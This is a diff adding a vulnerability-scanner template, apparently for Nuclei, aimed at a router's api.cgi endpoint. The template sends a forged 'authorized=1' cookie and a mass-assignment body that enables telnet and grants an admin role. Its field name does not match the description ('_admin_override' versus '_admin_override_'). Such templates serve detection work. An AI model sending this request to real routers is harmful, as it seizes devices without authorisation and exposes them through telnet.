@@ -1,0 +1,38 @@
+id: malgorouter-api-mass-assignment
+
+info:
+  name: MalgoRouter api.cgi - Mass Assignment / Legacy-Admin Auth Bypass
+  author: opencode
+  severity: high
+  description: |
+    /cgi-bin/api.cgi trusts the cookie "authorized=1" as legacy_admin, and
+    its config action is a mass-assignment sink that honours
+    "_enable_telnet_" / "_role_" / "_admin_override_" taken straight from
+    the request body.
+  classification:
+    cwe-id: CWE-915
+  metadata:
+    max-request: 1
+    product: malgorouter
+    vendor: glinet
+  tags: malgorouter,auth-bypass,mass-assignment,cwe-915,cwe-639
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/cgi-bin/api.cgi?action=config"
+    headers:
+      Cookie: "authorized=1"
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "_enable_telnet_=true&_role_=_admin_&_admin_override=true"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "status"
+          - "ok"
+        condition: and
+      - type: status
+        status:
+          - 200
